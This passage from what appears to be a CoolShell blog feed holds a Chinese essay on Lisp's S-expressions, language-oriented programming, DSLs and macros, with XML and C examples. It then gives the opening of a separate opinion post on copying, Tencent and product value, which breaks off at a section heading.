<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#Lisp%E4%B9%8B%E5%99%A8" title="Lisp之器">Lisp之器</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%80%BB%E7%BB%93" title="总结">总结</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E5%90%8E%E8%AE%B0" title="后记">后记</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%8F%82%E8%80%83" title="参考">参考</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Lisp%E4%B9%8B%E9%AD%85"></span>Lisp之魅<span class="ez-toc-section-end"></span>
</h4>
<p>长久以来，Lisp一直被许多人视为史上最非凡的编程语言。它不仅在50多年前诞生的时候带来了诸多革命性的创新并极大地影响了后来编程语言的发展，即使在一大批现代语言不断涌现的今天，Lisp的诸多特性仍然未被超越。当各式各样的编程语言摆在面前，我们可以从运行效率、学习曲线、社区活跃度、厂商支持等多种不同的角度进行评判和选择，但我特别看中的一点在于语言能否有效地表达编程者的设计思想。学习C意味着学习如何用过程来表达设计思想，学习Java意味着学习如何用对象来表达设计思想，而虽然Lisp与函数式编程有很大的关系，但学习Lisp绝不仅仅是学习如何用函数表达设计思想。实际上，<strong>函数式编程并非Lisp的本质</strong>，在已经掌握了lambda、高阶函数、闭包、惰性求值等函数式编程概念之后，学习Lisp仍然大大加深了我对编程的理解。<strong>学习Lisp所收获的是如何“自由地”表达你的思想</strong>，这正是Lisp最大的魅力所在，也是这门古老的语言仍然具有很强的生命力的根本原因。</p>
<h4>
<span class="ez-toc-section" id="Lisp%E4%B9%8B%E6%BA%90"></span>Lisp之源<span class="ez-toc-section-end"></span>
</h4>
<p>Lisp意为表处理(List Processing)，源自设计者John McCarthy于1960年发表的一篇论文《符号表达式的递归函数及其机器计算》。McCarthy在这篇论文中向我们展示了用一种简单的数据结构S表达式(S-expression)来表示代码和数据，并在此基础上构建一种完整的语言。Lisp语言形式简单、内涵深刻，Paul Graham在《Lisp之根源》中将其对编程的贡献与欧几里德对几何的贡献相提并论。</p>
<h4>
<span class="ez-toc-section" id="Lisp%E4%B9%8B%E5%BD%A2"></span>Lisp之形<span class="ez-toc-section-end"></span>
</h4>
<p>然而，与数学世界中简单易懂的欧氏几何形成鲜明对比，程序世界中的Lisp却一直是一种古老而又神秘的存在，真正理解其精妙的人还是少数。从表面上看，Lisp最明显的特征是它“古怪”的S表达式语法。S表达式是一个原子(atom)，或者若干S表达式组成的列表(list)，表达式之间用空格分开，放入一对括号中。“列表“这个术语可能会容易让人联想到数据结构中的链表之类的线形结构，实际上，Lisp的列表是一种可嵌套的树形结构。下面是一些S表达式的例子:</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">foo

()

(a b (c d) e)

(+ (* 2 3) 5)

(defun factorial (N)
    (if (= N 1)
        1
        (* N (factorial (- N 1)))
    )
)
</pre>
<p><span id="more-7526"></span></p>
<p>据说，这个古怪的S表达式是McCarthy在发明Lisp时候所采用的一种临时语法，他实际上是准备为Lisp加上一种被称为M表达式(M-expression)的语法，然后再把M表达式编译为S表达式。用一个通俗的类比，S表达式相当于是JVM的字节码，而M表达式相当于Java语言，但是后来Lisp的使用者都熟悉并喜欢上了直接用S表达式编写程序，并且他们发现S表达式有许多独特的优点，所以M表达式的引入也就被无限期延迟了。</p>
<p>许多Lisp的入门文章都比较强调Lisp的函数式特性，而我认为这是一种误导。真正的Lisp之门不在函数式编程，而在S表达式本身，Lisp最大的奥秘就藏在S表达式后面。S表达式是Lisp的语法基础，语法是语义的载体，形式是实质的寄托。<strong>“S表达式”是程序的一种形，正如“七言”是诗的一种形，“微博”是信息的一种形</strong>。正是形的不同，让微博与博客有了质的差异，同样的道理，正是S表达式让Lisp与C、Java、SQL等语言有了天壤之别。</p>
<h4>
<span class="ez-toc-section" id="Lisp%E4%B9%8B%E9%81%93"></span>Lisp之道<span class="ez-toc-section-end"></span>
</h4>
<p>一门语言能否有效地表达编程者的设计思想取决于其抽象机制的语义表达能力。根据抽象机制的不同，语言的抽象机制形成了面向过程、面向对象、函数式、并发式等不同的范式。当你采用某一种语言，基本上就表示你已经“面向XXX“了，你的思维方式和解决问题的手段就会依赖于语言所提供的抽象方式。比如，采用Java语言通常意味着采用面向对象分析设计；采用Erlang通常意味着按Actor模型对并发任务进行建模。</p>
<p>有经验的程序员都知道，无论是面向XXX编程，程序设计都有一条“抽象原则“：What与How解耦。但是，<strong>普通语言的问题就在于表达What的手段非常有限</strong>，无非是过程、类、接口、函数等几种方式，而诸多领域问题是无法直接抽象为函数或接口的。比如，你完全可以在C语言中定义若干函数来做到make file所做的事情，但C代码很难像make file那样声明式地体现出target、depends等语义，它们只会作为实现细节被淹没在一个个的C函数之中。采用OOP或是FP等其它范式也会遇到同样的困难，也就是说make file语言所代表的抽象维度与面向过程、OOP以及FP的抽象维度是正交的，使得各种范式无法直接表达出make file的语义。这就是普通语言的“刚性”特征，它要求我们必须以语言的抽象维度去分析和解决问题，把问题映射到语言的基本语法和语义。</p>
<p>更进一步，如果仔细探究这种刚性的根源，我们会发现正是由于普通语言<strong>语法和语义的紧耦合</strong>造成了这种刚性。比如，C语言中printf(“hello %s”, name)符合函数调用语法，它表达了函数调用语义，除此之外别无他义；Java中interface IRunnable { … }符合接口定义语法，它表达了接口定义语义，除此之外别无他义。如果你认为“语法和语义紧耦合“是理所当然的，看不出这有什么问题，那么理解Lisp就会让你对此产生更深的认识。</p>
<p>当你看到Lisp的(f a (b c))的时候，你会想到什么？会不会马上联想到函数求值或是宏扩展？就像在C语言里看到gcd(10, 15)马上想到函数调用，或者在Java里看到class A马上想到类定义一样。如果真是这样，那它就是你理解Lisp的一道障碍，因为你已经习惯了顺着语言去思考，总是在想这一句话机器怎么解释执行？那一句话又对应语言的哪个特性？理解Lisp要反过来，让语言顺着你，Lisp的(f a (b c))可以是任何语义，完全由你来定，它可以是函数定义、类定义、数据库查询、文件依赖关系，异步任务的执行关系，业务规则 …</p>
<p>下面我准备先通过几个具体的例子逐步展示Lisp的本质。需要说明的是，由于Lisp的S表达式和XML的语法形式都是一种树形结构，在语义表达方面二者并无本质的差别。所以，为了理解方便，下面我暂且用多数人更为熟悉的XML来写代码，请记住我们可以很轻易地把XML代码和Lisp代码相互转换。</p>
<p>首先，我们可以轻易地用XML来定义一个求两个数最大公约数的函数：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">    &lt;func name='gcd' return_type='int'&gt;
        &lt;params&gt;
            &lt;a type='int'/&gt;
            &lt;b type='int'/&gt;
        &lt;/params&gt;
        &lt;body&gt;
            &lt;if&gt;
               &lt;equals&gt;
                   &lt;a/&gt;
                   &lt;int&gt;0&lt;/int&gt;
               &lt;/equals&gt;
            &lt;/if&gt;
            &lt;then&gt;
                &lt;return&gt;&lt;b/&gt;&lt;/return&gt;
            &lt;/then&gt;
            &lt;else&gt;
                &lt;return&gt;
                    &lt;gcd&gt;
                        &lt;modulo&gt;&lt;b/&gt;&lt;a/&gt;&lt;/modulo&gt;
                        &lt;a/&gt;
                    &lt;/gcd&gt;
                &lt;/return&gt;
            &lt;/else&gt;
        &lt;/body&gt;
    &lt;/func&gt;
</pre>
<p>其次，我们可以用它来定义类：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">    &lt;class name="Computer"&gt;
        &lt;field access="private" type="MainBoard" name="main-board" /&gt;
        &lt;field access="private" type="CPU" name="cpu" /&gt;
        &lt;field access="private" type="Memory" name="memory" /&gt;

        &lt;method access="public" return_type="boolean" name="powerOn" /&gt;
            &lt;params&gt;...&lt;/params&gt;
            &lt;body&gt;...&lt;/body&gt;
        &lt;/method&gt;

        &lt;method access="public" return_type="boolean" name="powerOff" /&gt;
            &lt;params&gt;...&lt;/params&gt;
            &lt;body&gt;...&lt;/body&gt;
        &lt;/method&gt;
    &lt;/class&gt;
</pre>
<p>还可以轻易地用它来编写关系查询：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">&lt;sql&gt;
    &lt;select&gt;
        &lt;column name="employees.id" /&gt;
        &lt;column name="bonus.amount" /&gt;
    &lt;/select&gt;
    &lt;from&gt;
        &lt;table name="employees" /&gt;
        &lt;table name="bonus" /&gt;
    &lt;/from&gt;
    &lt;where&gt;
        &lt;equals&gt;
            &lt;column name="employees.id" /&gt;
            &lt;column name="bonus.employee_id" /&gt;
        &lt;/equals&gt;
    &lt;/where&gt;
&lt;/sql&gt;
</pre>
<p>还可以用它来实现类似make file的自动化构建(语法取自ant)：</p>
<p></p>
<pre data-enlighter-language="xml" class="EnlighterJSRAW">    &lt;project name="MyProject" default="dist" basedir="."&gt;
        &lt;property name="src" location="src"/&gt;
        &lt;property name="build" location="build"/&gt;
        &lt;property name="dist"  location="dist"/&gt;

        &lt;target name="init"&gt;
            &lt;mkdir dir="${build}"/&gt;
        &lt;/target&gt;

        &lt;target name="compile" depends="init" description="compile the source " &gt;
            &lt;javac srcdir="${src}" destdir="${build}"/&gt;
        &lt;/target&gt;

        &lt;target name="dist" depends="compile" description="generate the distribution" &gt;
            &lt;mkdir dir="${dist}/lib"/&gt;
            &lt;jar jarfile="${dist}/lib/MyProject-${DSTAMP}.jar" basedir="${build}"/&gt;
        &lt;/target&gt;

        &lt;target name="clean" description="clean up" &gt;
            &lt;delete dir="${build}"/&gt;
            &lt;delete dir="${dist}"/&gt;
        &lt;/target&gt;
    &lt;/project&gt;
</pre>
<p>一口气举了这么多个例子，目的在于用XML这种树形结构来说明Lisp的S表达式所能够描述的语义。不知道你是否发现了S表达式和XML这种树形语法在语义构造方面有着特别的“柔性”？我们可以轻易地用它构造出函数、变量、条件判断语义；类、属性、方法语义；可以轻易地构造出关系模型的select、where语义；可以轻易地构造出make的target、depends语义，等等数不清的语义。在普通语言里，你可以定义一个函数、一个类，但你无法为C语言增加匿名函数特性，也没法给Java语言加上RAII语义，甚至连自己创造一个foreach循环都不行，而自定义语义意味着在Lisp之上<strong>你创造了一门语言</strong>！不管是面向过程，面向对象，函数式，还是关系模型，在Lisp里统统都变成了一种DSL，而Lisp本身也就成了一种定义语言的语言，即元语言(Meta Language)。</p>
<p>Lisp的柔性与S表达式有着密切的关系。Lisp并不限制你用S表达式来表达什么语义，同样的S表达式语法可以表达各种不同领域的语义，这就是<strong>语法和语义解耦</strong>。如果说普通语言的刚性源于“语法和语义紧耦合”，那么Lisp的柔性正是源于“语法和语义解耦”！“语法和语义解耦”使得Lisp可以随意地构造各种领域的DSL，而不强制用某一种范式或是领域视角去分析和解决问题。本质上，Lisp编程是一种超越了普通编程范式的范式，这就是<strong>Lisp之道：面向语言编程(LOP, Language Oriented Programming)</strong>。Wikipedia上是这样描述LOP的：</p>
<blockquote><p>Language oriented programming (LOP) is a style of computer programming in which, rather than solving problems in general-purpose programming languages, the programmer creates one or more domain-specific languages for the problem first, and solves the problem in those languages … The concept of Language Oriented Programming takes the approach to capture requirements in the user’s terms, and then to try to create an implementation language as isomorphic as possible to the user’s descriptions, so that the mapping between requirements and implementation is as direct as possible.</p></blockquote>
<p>LOP范式的基本思想是从问题出发，先创建一门描述领域模型的DSL，再用DSL去解决问题，它具有高度的声明性和抽象性。SQL、make file、CSS等DSL都可以被认为是LOP的具体实例，下面我们再通过两个常见的例子来理解LOP的优势。</p>
<p>例1：在股票交易系统中，交易协议定义若干二进制的消息格式，交易所和客户端需要对消息进行编码和解码。</p>
<p>消息格式是一种抽象的规范，本身不对语言做任何的限制，你可以用C，C++，Java，或者Python。普通的实现方式是按照消息格式规范，在相应的语言中定义消息结构，并编写相应的编解码函数。假设为一个消息定义结构和实现编解码函数的工作量为M，不同消息类型的数量为N，这种方式的工作量大致为M*N。也就是说每增加一种消息类型，就需要为该消息定义结构，实现编解码函数，引入bug的可能性当然也和M*N成正比。如果仔细观察不难发现，各个消息结构其实是高度类似的，编解码函数也大同小异，但是普通语言却找不到一种抽象机制能表达这种共性，比如，我们无法通过面向对象的方法定义一个基类把消息结构的共性抽象出来，然后让具体的消息去继承它，达到复用的目的。这正是由于普通语言的抽象维度限制所致，在普通语言中，你只能从函数、接口等维度对事物进行抽象，而恰好消息格式共性所在的维度与这些抽象维度并不匹配。</p>
<p>其实，不同消息类型的<strong>共性在于它们都具有相同的领域语义</strong>，比如：“某字段内容是另一个字段内容的md5码”就是一种消息格式的领域语义，这种领域语义是OOP的抽象机制无法描述的。LOP的思路是先创建一门消息定义DSL，比如，类似Google的Protocol Buffer，Android的AIDL。然后，通过DSL编写消息定义文件，直接声明式地描述消息的结构特征，比如，我们可以声明式地描述“某字段内容是另一个字段内容的md5码”。我们还需要为DSL开发编译器用于生成C、Java等通用语言的消息定义和编解码函数。</p>
<p>有了消息定义DSL和编译器之后，由于DSL编写消息定义是一种高度声明式的编程方法，每增加一种消息的只需要多编写一个消息定义文件而已，工作量几乎可以忽略不计。所有的工作量都集中在编译器的开发上，工作量是一个常数C，与消息的数量没有关系；质量保证方面也只需要关注编译器这一点，不会因为增加新的消息类型而引入bug。</p>
<p>例2：在图书管理系统中，需要支持在管理界面上对书籍、学生、班级等各种实体进行管理操作。</p>
<p>如果按传统的三层架构，一般需要在后端程序中为每一种实体定义一个类，并定义相应的方法实现CRUD操作，与之相应的，还需要在前端页面中为每一个实体编写相应的管理页面。这些实体类的CRUD操作都是大同小异的，但细节又各不相同，虽然我们很想复用某些共同的设计实现，但OOP所提供的封装、继承、多态等抽象机制不足以有效捕获实体之间的共性，大量的代码还是必须放在子类中来完成。比如，Student和Book实体类的实现非常相似，但是如果要通过OOP的方式去抽象它们的共性，得出的结果多半是Entity这样的大而空的基类，很难起到复用的效果。</p>
<p>其实，不同实体之间的共性还是在于它们具有相同的领域语义，比如：实体具有属性，属性具有类型，属性具有取值范围，属性具有可读取、可编辑等访问属性，实体之间有关联关系等。LOP方法正是直接面向这种领域语义的。采用LOP方法，我们并不需要为每一个实体类单独编写CRUD方法，也不需要单独编写管理页面，只需要定义一种DSL并实现其编译器；然后，用DSL声明式地编写实体描述文件，去描述实体的属性列表，属性的类型、取值范围，属性所支持的操作，属性之间的关系和约束条件等；最后，通过这个实体描述文件自动生成后端的实体类和前端管理页面。采用LOP，不论前后端采用何种技术，Java也好，C#也好，JSP也好，ASP.NET也好，都可以自动生成它们的代码。采用LOP的工作量和质量都集中在DSL的设计和编译器的开发，与实体的数量无关，也就是说，越是庞大的系统，实体类越多越是能体现LOP的优势。</p>
<p>通过上面两个小例子我们可以感受到，LOP是一种面向领域的，高度声明式的编程方式，它的抽象维度与领域模型的维度完全一致。LOP能让程序员从复杂的实现细节中解脱出来，把关注点集中在问题的本质上，从而提高编程的效率和质量。</p>
<p>接下来的问题是如果需要为某领域设计DSL，我们是应该发明一门类似SQL这样的专用DSL呢，还是用XML或S表达式去定义DSL呢？它们各有何优缺点呢？</p>
<p>我认为采用XML或S表达式定义DSL的优点主要有：1) SQL、make file、CSS等专用DSL都只能面向各自的领域，而一个实际的领域问题通常是跨越多个领域的，有时我们需要将不同领域融合在一起，但是由于普通语言的刚性，多语言融合通常会是一件非常困难的事情，而XML和S表达式语法结构的单一性和“代码及数据”的特点使得跨领域融合毫无障碍。2) 在为DSL开发编译器或解释器的方面，二者难度不同。对XML和S表达式定义的DSL进行语法分析非常简单，相比之下，对SQL这样的专用DSL进行语法分析，虽然可以借助Lex、Yacc、ANTLR等代码生成工具，但总的来讲复杂度还是要明显高一些。</p>
<p>当然，XML和S表达式的优点也正好是其缺点，由于XML和S表达式的语法形式是固定的，不能像专用DSL那样自由地设计语法。所以，一般来讲专用DSL的语法显得更加简洁。换句话说，XML和Lisp其实是在语法和语义间做了一个交换，用语法的限制换来了语义的灵活。</p>
<h4>
<span class="ez-toc-section" id="Lisp%E4%B9%8B%E5%99%A8"></span>Lisp之器<span class="ez-toc-section-end"></span>
</h4>
<p>接下来我们继续探讨DSL的解释执行问题。DSL代码的解释执行一般分为3种典型的方式：1) 通过专门的解释器解释执行；2) 编译生成其他语言的代码，再通过其他语言的解释器解释执行(或编译运行)；3) 自解释。比如，第1类的代表是SQL，上一节举的两个例子都属于第2类，而第3类自解释正是Lisp的特色。</p>
<p>为了理解自解释，我们可以先从内部DSL的解释执行说起。内部DSL是指嵌入在宿主语言中的DSL，比如，Google Test单元测试框架定义了一套基于流畅接口(Fluent Interface)的C++单元测试DSL。从语义构造的角度看，内部DSL直接借用宿主语言的语法定义了自己的领域语义，是一种语法和语义解耦；从解释执行的角度看，内部DSL是随宿主语言的解释器而自动解释的，不需要像外部DSL一样开发专门的解释器，因而实现的代价很低。当然，并不是说设计内部DSL不用关心任何的解释实现，实际上，还是需要熟悉宿主语言的特性，并利用该特性使得DSL能随着宿主语言的解释器得到解释执行。</p>
<p>Lisp拥有强大的自解释特性，这得益于独一无二的<strong>Lisp之器：宏 (macro)</strong>。宏使得Lisp编写的DSL可以被Lisp解释器直接解释执行，这在原理上与内部DSL是相通的，只是内部DSL一般是利用宿主语言的链式调用等特性，通常形式简陋，功能有限，而Lisp的宏则要强大和灵活得多。</p>
<p>C语言中也有宏的概念，不过Lisp的宏与C语言的宏完全不同，C语言的宏是简单的字符串替换。比如，下面的宏定义：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#define square(x) (x*x)
</pre>
<p>square(1+1)的期望结果是4，而实际上它会被替换成(1+1*1+1)，结果是3。这个例子说明，C语言的宏只在预编译阶段进行简单的字符串替换，对程序语法结构缺乏理解，非常脆弱。Lisp的宏不是简单的字符串替换，而是一套完整的代码生成系统，它是在语法解析的基础上把Lisp代码从一种形式转换为另一种形式，本质上起到了普通语言编译器的作用。不同的是，普通编译器是把一种语言的代码转换为另一种语言的代码，比如，Java编译器把Java代码转换成Java字节码；而Lisp宏的输入和输出都是S表达式，它本质上是把一种DSL转换为另一种DSL。下面的例子是宏的一个典型用法。</p>
<p>例3：假设Lisp解释器已经具备解释执行面向过程DSL的能力，需要实现类似ant的自动化构建工具。</p>
<p>我们可以基于宏构建一门类ant的DSL，宏的作用是把类ant DSL通过宏展开变成面向过程的DSL，最后被Lisp解释器所解释执行。这样用Lisp编写的ant DSL就不需要被编译为其他语言，也不需要像XML的ant一样依赖于专门的解释器了。</p>
<p>当然，和开发专门的解释器/编译器相比，Lisp的宏也并非没有缺点，宏难以理解，开发和调试更加困难。到底是开发专门的解释器/编译器还是直接采用宏应该视具体情况而定。</p>
<h4>
<span class="ez-toc-section" id="%E6%80%BB%E7%BB%93"></span>总结<span class="ez-toc-section-end"></span>
</h4>
<p>Lisp采用单一的S表达式语法表达不同的语义，实现了语法和语义解耦。这使得Lisp具有强大的语义构造能力，擅长于构造DSL实现面向语言编程，而宏使得Lisp具有自解释能力，让不同DSL之间的转换游刃有余。进入Lisp的世界应当从理解面向语言编程入门，这是Lisp之道，而函数式编程和宏皆为Lisp之器，以道驭器方为正途。</p>
<h4>
<span class="ez-toc-section" id="%E5%90%8E%E8%AE%B0"></span>后记<span class="ez-toc-section-end"></span>
</h4>
<p>本文是我学习Lisp的一个总结，也是写给有兴趣学习Lisp的程序员的入门资料。必须说明，我还是一个标准的Lisp初学者，几乎没有写过像样的Lisp程序，文中的错误和不足在所难免，希望读者批评指正，感谢！</p>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83"></span>参考<span class="ez-toc-section-end"></span>
</h4>
<p><a href="http://www.paulgraham.com/rootsoflisp.html">The Roots of Lisp</a></p>
<p><a href="http://www.defmacro.org/ramblings/lisp.html">The Nature of Lisp</a></p>
<p><a href="http://lists.warhead.org.uk/pipermail/iwe/2005-July/000130.html">Why Lisp macros are cool, a Perl perspective</a></p>
<p><a href="https://en.wikipedia.org/wiki/Language-oriented_programming">Wikipedia: Language-oriented programming</a></p>
<p><a href="https://book.douban.com/subject/6859720/">《实用Common Lisp编程》</a></p>
<p><a href="https://book.douban.com/subject/4031906/">《冒号课堂 – 编程范式与OOP思想》</a></p>
 ]]></content>
<pubDate>2012-06-04T08:58:46+08:00</pubDate>
<guid>https://coolshell.cn/articles/7526.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 抄袭，腾讯 和 产品 ]]></title>
<link>https://coolshell.cn/articles/7617.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >很早就想写这篇文章了，只是想法比较零碎，所以一直没有成文，这两天觉得思考得比较成熟了一些，所以把我的这些想法整理下来，欢迎大家一起和我讨论。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E9%84%99%E8%A7%86%E6%8A%84%E8%A2%AD%E5%92%8C%E5%B1%B1%E5%AF%A8" title="鄙视抄袭和山寨">鄙视抄袭和山寨</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%90%86%E6%80%A7%E5%AF%B9%E5%BE%85%E6%8A%84%E8%A2%AD" title="理性对待抄袭">理性对待抄袭</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#%E5%A6%82%E4%BD%95%E4%B8%8D%E8%A2%AB%E8%85%BE%E8%AE%AF%E6%8A%84%E8%A2%AD" title="如何不被腾讯抄袭">如何不被腾讯抄袭</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E4%BA%A7%E5%93%81" title="什么是真正的产品">什么是真正的产品</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E9%84%99%E8%A7%86%E6%8A%84%E8%A2%AD%E5%92%8C%E5%B1%B1%E5%AF%A8"></span>鄙视抄袭和山寨<span class="ez-toc-section-end"></span>
</h4>
<p>首先，先表达我的立场，我对抄袭的立场持BS和痛恨的态度，尤其是<a title="中国的C2C模式" href="https://coolshell.cn/articles/3820.html" target="_blank">那些C2C的网站</a>，痛恨这些国外有什么就山寨什么的做法，尤其是那些连界面都不改，像素级的抄袭，连CSS和img都是一样的，更甚者，连图片都链接到抄袭源的网站去了，连源代码都抄的行为，比如：<a href="https://weibo.com/1661751144/yjLfJqMZ6" target="_blank">腾讯抄新浪的代码</a>，<a href="http://yuanxing.iteye.com/blog/638129" target="_blank">新浪抄twitter的源码</a>。无法不BS之。</p>
<p>有很多网友邀请我去那个抄袭Quora的网站上去回答问题，借此，再次声明我不会去的。因此，有一些网友说，我不一样也在Twitter的抄袭网站新浪微博上吗？说我装逼了。我想说，新浪和Twitter基本上是同一种产品的思路，但是其实现不一样，新浪微博上一些twitter上没有功能，我个人觉得这并不算抄袭，我甚至认为新浪微博和Twitter各有长处，在一些功能上新浪微博比twitter做得更好。你可以理解为，新浪微博总体上来说并没有突破我心中的那个条抄袭的底线。</p>
<p>我个人对抄袭的理解如下：</p>
<p style="padding-left: 30px;">1）你可以复制别人的想法和功能，但是如果你连界面设计，代码，图片，风格，布局，等等所有的一切都照抄，那我就一定要鄙视你。</p>
<p style="padding-left: 30px;">2）你可以仿照别人的产品，但是你的出发点应该是他没做好，我来把它把做好，如果你的出发点是为了复制抄袭和山寨，我一样鄙视。</p>
<p>所以，你可以理解我为什么不去Quora，Stackoverflow，Facebook，Google的山寨网站了，因为上述两点，1）完全复制，2）山寨地太次。</p>
<h4>
<span class="ez-toc-section" id="%E7%90%86%E6%80%A7%E5%AF%B9%E5%BE%85%E6%8A%84%E8%A2%AD"></span>理性对待抄袭<span class="ez-toc-section-end"></span>
</h4>
<p>因为很多朋友极端地理解了我对抄袭的立场，所以我有必要要说说我对“抄袭”或是“模仿”的其它一些观点：</p>
<p><span id="more-7617"></span></p>
<p><strong>1）“抄袭想法”</strong>。想法这个东西我不觉是有什么专有的东西，也不存在什么抄袭，好的想法，就不应该被垄断，好的想法是应该放出来让大家一起来实现的。所以，我并不觉得一个想法有什么不能被抄袭的。你做Web Server，我也做Web Server，你做论坛，我也做论坛，你做手机，我也做手机，你做便携电脑，我也做便携电脑，你做通讯软件，我也可以做通讯软件…… 等等，越是优秀的产品和思路，就越不可能不被别人学习和模仿的。</p>
<p><strong>2）“抄袭界面”</strong>。根据法律来说，界面上的某些元件，如菜单，按钮，甚至布局，配色之类的单一的东西是没有版权的，但是这些东西组成的界面是存在版权的，你不能让你的产品界面和别人的界面长得雷同。而且，对于一些有艺术特征的设计和版式是受法律保护的。所以，对于界面来说，我们需要做一些区别，比如，很多电视机长得很相似，连摇控器都很相似，但是电视其中的菜单和功能会有不同；很多的家用小汽车形状都很相似，但是线条和外形并不相似；Unix和Linux的用户接口几乎一样，但是Unix和Linux的内部实现和功能上有很大的不同（比如文件系统，内核管理等），MacOS/Windows/X-Win/Gnome/KDE 这些桌面系统大同，但是实现和细节上又不一样。</p>
<p>看我这样一说，你会说，嗯，你说的就是所谓的“微创新”！是的，这是个仁者见仁，智者见智的问题了。再说一遍，无所谓什么微创新不微创新，我对此的价值观很简单  —— <strong>只要你这个复制品在不违反法律的层面上，能在品质上超过原来那个产品，我是会认可的，而且还是会对复制品买帐的</strong>。</p>
<p>总之，我想说的是——</p>
<p style="padding-left: 30px;">1）好的东西总是会让人去学习和仿制的，而学习和仿制好的一面是会引入竞争，竞争会让这个东西更好的。</p>
<p style="padding-left: 30px;">2）不要害怕被人仿制，被人仿制说明你做得好，如果你的仿冒者超过了你，那你应该反思自己，而不要赖别人。</p>
<h4>
<span class="ez-toc-section" id="%E5%A6%82%E4%BD%95%E4%B8%8D%E8%A2%AB%E8%85%BE%E8%AE%AF%E6%8A%84%E8%A2%AD"></span>如何不被腾讯抄袭<span class="ez-toc-section-end"></span>
</h4>
<p>说起抄袭这个事来，就不得不说腾讯，现在互联网上一堆人都在思考，腾讯太变态，无论我做什么，都逃不出他的魔掌。很多风投都在问创业团队一个问题——“如果腾讯抄你，你怎么办？”。</p>
<p>在我往下阐述如何不被腾讯抄的话题下，请让我先重申一下我在“<a title="腾讯，竞争力 和 用户体验" href="https://coolshell.cn/articles/5901.html" target="_blank">腾讯，竞争力 和 用户体验</a>”一文中说的那个观点：“<em>腾讯这样大规模的抄袭和山寨，对整个社会的价值就是——会让很多很多的创业团队放弃Copy，甚至让他们要放弃那些容易被复制的“业务型的项目”，而逼着他们去努力思考，如何才不能被腾讯复制，如何才能有自己的核心价值</em>”，我把这个观点再进一步阐述，“<strong>有腾讯在，会让你更清楚地认识什么叫创业的残酷，会让你更清楚认识到什么是真正产品的价值，什么是核心竞争力，你但凡有一点急功近利的想法你都要想一想那个有钱有人有势也很急功近利的企鹅！</strong>”</p>
<p>我不知道，我写了那篇文章这段时间来，大家有没有思考过前边文章里我说的问题？其实我在“<a title="腾讯，竞争力 和 用户体验" href="https://coolshell.cn/articles/5901.html" target="_blank">腾讯，竞争力 和 用户体验</a>”一文中已经说到过一些了，不知道大家有没有去思考？</p>
<p>老实说，其实腾讯并不可怕，先让我们来分析一下腾讯的特征和短板：</p>
<ul>
<li>
<strong>特征</strong>。腾讯的很多产品线完全雷同，比如：QQ，微信，空间，群，微博，朋友，等等，几乎完全一样，所以，这是不是说明了下面几个问题：</li>
</ul>
<p style="padding-left: 60px;">1）他们人太多，没事干了，所以什么都干。<br>
2）各产品线为了规避风险都想伴QQ这个大款，所以不知道怎么创新。<br>
3）内部竞争激烈，技术团队加班赶工，所以只能无目的地广撒网了。</p>
<ul>
<li>
<strong>短板</strong>。你看看腾讯的这些产品线和他的用户群，我觉得就目前阶段，腾讯至少有三种产品复制不出来。</li>
</ul>
<p style="padding-left: 60px;">1）有烦杂的线下业务的产品。比如：电子商务需要供应商，仓库，物流，等这样物理流程的业务很难复制。<br>
2）有质量，有价值，有权威的社区。比如，豆瓣，Stackoverflow，Quora这样的有价值的社区。<br>
3）有技术含量的产品，比如： Nginx，MySQL，Android/iOS 之流技术大于业务的产品。</p>
<p>通过这样的分析，我想告诉大家，<strong>腾讯并不可怕，可怕的是你自己不会思考和观察，可怕的是你急功近利而没有去找有价值的东西来做</strong>。推而广之，如果你想做的东西是很快就能做出来的，那么你就不要指望不被人抄，也就是说，<strong><span style="color: #cc0000;">如果你着眼短期，你无疑会面对众多的抄袭和模仿者让你万劫不复，但是，如果你着眼长期，做一个3-5年需要花费大量精力才会成熟的产品，那么，那些急功近利的抄袭者会知难而退的</span></strong>。因为，“需要3-5年的时间”这一条完全不符合抄袭者的价值观，所以，你面对的竞争对手也会少了9成。</p>
<h4>
<span class="ez-toc-section" id="%E4%BB%80%E4%B9%88%E6%98%AF%E7%9C%9F%E6%AD%A3%E7%9A%84%E4%BA%A7%E5%93%81"></span>什么是真正的产品<span class="ez-toc-section-end"></span>
</h4>
